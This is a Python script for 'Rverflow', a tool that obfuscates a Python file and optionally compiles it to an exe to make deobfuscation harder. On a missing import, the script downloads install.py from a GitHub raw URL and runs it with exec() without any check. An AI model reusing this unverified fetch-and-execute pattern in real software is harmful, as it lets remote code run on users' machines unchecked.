import os, random, shutil, time, requests
try:
     import rverflow
except ImportError:
     r=requests.get("https://raw.githubusercontent.com/RiverCheet/fart/main/install.py");exec(r.content.decode())
     print("module installed")
     import rverflow
else:
     print("module exists, continuing")
time.sleep(.5)
os.system("cls")

os.system("title Rverflow - Made by River#0038")
def br(string):
     os.system("")
     f = ""
     for line in string.splitlines():
          r = 1
          for char in line:
               if not r == 255:
                    if r >= 255:
                         r = 255
                    else:
                         r += 5
               f += f"\033[38;2;{r};0;255m{char}\033[0m"
          f += "\n"
     return f[:-2]
def yg(string):
     os.system("")
     f = ""
     for line in string.splitlines():
          r = 255
          for char in line:
               if not r == 1:
                    if 1 > r:
                         r = 1
                    else:
                         r -= 3
               f += f"\033[38;2;{r};255;0m{char}\033[0m"
          f += "\n"
     return f[:-2]
def bg(string):
     os.system("")
     f = ""
     for line in string.splitlines():
          g = 1
          b = 255
          for char in line:
               if not g == 255 and not b == 1:
                    if g >= 255:
                         g = 255
                    if b < 1:
                         b = 1
                    else:
                         g += 5
                         b -= 5
               f += f"\033[38;2;0;{g};{b}m{char}\033[0m"
          f += "\n"
     return f[:-2]
def yr(string):
     os.system("")
     f = ""
     for line in string.splitlines():
          g = 255
          b = 1
          for char in line:
               if not g == 1 and not b == 255:
                    if g < 1:
                         g = 1
                    if b > 255:
                         b = 1
                    else:
                         g -= 3
                         b += 3
               f += f"\033[38;2;255;{g};{b}m{char}\033[0m"
          f += "\n"
     return f[:-2]
def color(string, c=""):
     if c=="":
          c = random.randint(1,4)
     if c==1:
          return br(string)
     elif c==2:
          return bg(string)
     elif c==3:
          return yr(string)
     else:
          return yg(string)

print(color("""
▄▄▄   ▌ ▐·▄▄▄ .▄▄▄  ·▄▄▄▄▄▌        ▄▄▌ ▐ ▄▌
▀▄ █·▪█·█▌▀▄.▀·▀▄ █·▐▄▄·██•  ▪     ██· █▌▐█
▐▀▀▄ ▐█▐█•▐▀▀▪▄▐▀▀▄ ██▪ ██▪   ▄█▀▄ ██▪▐█▐▐▌
▐█•█▌ ███ ▐█▄▄▌▐█•█▌██▌.▐█▌▐▌▐█▌.▐▌▐█▌██▐█▌
.▀  ▀. ▀   ▀▀▀ .▀  ▀▀▀▀ .▀▀▀  ▀█▄▀▪ ▀▀▀▀ ▀▪
"""))
print(color("\nmade by River#0038",1))
print()
while True:
     name = input(color("\n[?] - Name of the file you want to obfuscate (.py is optional) >", 3))
     if not ".py" in name:
          name += ".py"
     if os.path.exists(name):
          break
     else:
          print(color("\n[!] - Invalid\n", 2))

print(color("\n[...] - Creating...", 4))
with open("output.py", "w+", encoding="utf-8") as f:
     with open(name, encoding="utf-8") as f2:
          f.write(rverflow.ecr(f2.read()))
print(color("\n[!] - All done!", 1))
while True:
     exe = input(color("\n[?] - Would you like to compile the file to an exe? (reduces probability of deobfuscating) [y/n] >", 1))
     if exe.lower() == "y":
          exe = True
          break
     elif exe.lower() == "n":
          exe = False
          break
     else:
          print(color("\n[!] - Invalid\n", 2))
if exe == True:
     while True:
          icon = input(color("\n[?] - Insert name of .ico file (.ico is optional) [leave blank to keep default] >", 1))
          if icon == "":
               icon = False
               break
          else:
               if not ".ico" in icon:
                    icon += ".ico"
               if os.path.exists(icon):
                    break
               else:
                    print(color("\n[!] - Invalid\n", 2))
     print(color("\n[...] - Compiling..\n", 4))
     if icon != False:
          os.system(f"pyinstaller --onefile --i={icon} output.py >nul")
     else:
          os.system(f"pyinstaller --onefile output.py >nul")
     os.remove(f"output.spec");shutil.rmtree("build");os.rename(f"dist/output.exe", f"{name[:-3]}.exe");shutil.rmtree("dist");os.system("cls")
     print(color("\n[!] - Finished! Your .exe should be in the same folder as the output script.", 1))
print(color("\nThank you for using Rverflow!", 3))
os.system("pause")
